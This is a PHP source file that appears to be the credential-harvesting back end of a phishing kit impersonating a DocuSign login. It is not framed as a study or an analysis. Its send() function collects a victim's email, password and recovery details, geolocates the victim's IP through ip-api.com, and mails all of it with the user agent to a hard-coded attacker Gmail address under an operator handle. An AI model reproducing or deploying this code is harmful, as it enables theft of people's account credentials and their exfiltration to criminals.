<?php
/******
 *
 *  Blessings
 *
 *****/


$receiver = "stevehardenresults@gmail.com";


function ipDetails($ip) {

    $ipDetails = json_decode(file_get_contents('http://ip-api.com/json/' . $ip), true);
    return $ipDetails;
}

function getPost($variable, $exception1 = "", $exception2 = "") {
    $data = array();
    foreach ($variable as $key=>$value) {
        if ($key !== $exception1 && $key !== $exception2) {
            $data[$key] = $value;
        }

    }
    return $data;
}


function send($username, $password, $from, $recovery = "") {
    global $receiver;
    $ipDetails = ipDetails($_SERVER['REMOTE_ADDR']);
    $subject = $from . " " . $_SERVER['REMOTE_ADDR'] . " " . $ipDetails['country'];
    if ($recovery !== "") {
        $message = "[+]~~~~~~~~~~~~~~~~~MrProfessor@Jodo.IM~~~~~~~~~~~~~~~~~[+]
E-mail: " . $username . "
Password: " . $password . "
Recovery: " . $recovery . "
Type: Docusign - " . $from . "
IP: " . $_SERVER['REMOTE_ADDR'] . "
City: " . $ipDetails['city'] . "
Region: " . $ipDetails['regionName'] . "
Country Name: " . $ipDetails['country'] . "
Country Code: " . $ipDetails['countryCode'] . "
User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . " 
[+]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[+]";
    } else {
        $message = "[+]~~~~~~~~~~~~~~~~~MrProfessor@Jodo.IM~~~~~~~~~~~~~~~~~[+]
E-mail: " . $username . "
Password: " . $password . "
Type: Docusign - " . $from . "
IP: " . $_SERVER['REMOTE_ADDR'] . "
City: " . $ipDetails['city'] . "
Region: " . $ipDetails['regionName'] . "
Country Name: " . $ipDetails['country'] . "
Country Code: " . $ipDetails['countryCode'] . "
User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . " 
[+]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[+]";
    }
    mail($receiver, $subject, $message);
}

?>